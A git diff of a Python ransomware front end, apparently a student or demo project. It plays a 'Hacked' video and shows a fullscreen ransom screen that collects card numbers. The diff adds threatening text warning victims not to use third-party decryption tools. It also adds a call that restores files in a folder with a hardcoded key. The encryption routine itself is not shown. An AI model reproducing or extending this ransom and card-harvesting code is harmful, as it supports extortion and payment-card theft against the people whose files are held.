@@ -2,7 +2,7 @@ import cv2
 import tkinter as tk
 from tkinter import messagebox
 import subprocess
-
+from restorer_ware import restore_files_in_directory 
 
 def validate_and_submit(window):
     card_number = window.card_number_entry.get().strip()
@@ -14,18 +14,32 @@ def validate_and_submit(window):
         messagebox.showerror("Validation Error", "All fields are required!")
         return
     
-    messagebox.showinfo("Success", "Thank you! Your details have been submitted.")
-    execute_script()
-def execute_script():
-    try:
-        subprocess.run(["python", "decryption.py"])
-        messagebox.showinfo("Ransomware", "Thank you for paying us! Decryption will start now.")
-    except Exception as e:
-        messagebox.showerror("Error", f"Failed to execute the script: {e}")
+    messagebox.showinfo("Success", "Thank you! Your details have been submitted .")
+    window.destroy()
+    show_success_message()
+    
+
+
+def show_success_message():
+    restore_files_in_directory("./dossier_confidentiel","bonjourbonjourbonjourbonjourbonj")
+    txt_color = "lightgreen"
+    bg_color = "black"
+    window = tk.Tk()
+    window.configure(bg=bg_color,padx=20,pady=200)   
+    window.title("Thank you !")
+    window.geometry("{0}x{1}+0+0".format(window.winfo_screenwidth(), window.winfo_screenheight()))
+    window.attributes("-fullscreen", True)
+    window.label = tk.Label(window, text="Your files have been decrypted! You can now access them safely!", font=("Arial", 16, "bold",))
+    window.label.pack()
+    change_label_config(window, fg_color=txt_color, bg_color=bg_color)
+
+
 def change_label_config(window, fg_color, bg_color):
     for widget in window.winfo_children():
         if isinstance(widget, tk.Label):  
             widget.configure(fg=fg_color, bg=bg_color,pady=10)
+
+
 def play_video(video_path):
 
     cap = cv2.VideoCapture(video_path)
@@ -48,11 +62,13 @@ def play_video(video_path):
         frame = cv2.resize(frame, (desired_width, desired_height))
         cv2.imshow('Video', frame)
         
-        if cv2.waitKey(10) & 0xFF == ord('q'):
+        if cv2.waitKey(1) & 0xFF == ord('q'):
             break
     cap.release()
     audio.release()
     cv2.destroyAllWindows()
+
+
 def show_ransom_message():
     txt_color = "lightgreen"
     bg_color = "black"
@@ -61,7 +77,7 @@ def show_ransom_message():
     window.title("Ransomware")
     window.geometry("{0}x{1}+0+0".format(window.winfo_screenwidth(), window.winfo_screenheight()))
     window.attributes("-fullscreen", True)
-    window.label = tk.Label(window, text="Your files have been encrypted! That's a shame ! But you can get them back! Use the fields below to send us the money. Tic tac tic tac !".upper(), font=("Arial", 16, "bold",))
+    window.label = tk.Label(window, text="Your files have been encrypted! That's a shame ! But you can get them back! Use the fields below to send us the money. Tic tac tic tac !`\n- Do not attempt to manually restore or decrypt your files or they will be lost forever\n- Do not use third party decryption tools or you may damage your files or corrupt them".upper(), font=("Arial", 16, "bold",))
     window.label.pack()
 
     card_number_label = tk.Label(window,  text="Card Number:")
@@ -91,6 +107,7 @@ def show_ransom_message():
     exit_button.pack()
 
     window.mainloop()
+
 if __name__ == "__main__":
     video_path = "Hacked.mp4" 
     play_video(video_path)
